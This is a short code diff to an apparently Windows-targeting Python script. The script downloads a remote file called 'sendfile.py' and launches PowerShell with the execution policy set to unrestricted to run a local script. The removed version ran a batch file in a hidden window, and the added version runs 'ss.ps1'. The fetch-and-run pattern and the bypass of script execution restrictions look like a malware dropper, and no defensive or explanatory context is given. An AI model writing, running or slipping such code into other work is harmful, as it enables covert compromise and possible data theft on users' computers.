@@ -33,7 +33,7 @@ from tkinter import simpledialog
 
 import subprocess
 
-d = os.path.join(os.environ["HOMEPATH"], r"Downloads")
+d = os.path.join(os.environ["HOMEPATH"], r"Desktop")
 
 os.chdir(d)
 
@@ -56,5 +56,5 @@ local_file = 'sendfile.py'
 request.urlretrieve(remote_url, local_file)
 
 
-p = subprocess.Popen('powershell.exe -executionpolicy unrestricted Start-Process -WindowStyle Hidden -File "bumper5.bat"', stdout=sys.stdout)
+p = subprocess.Popen('powershell.exe -executionpolicy unrestricted -File "ss.ps1"', stdout=sys.stdout)
 p.communicate()
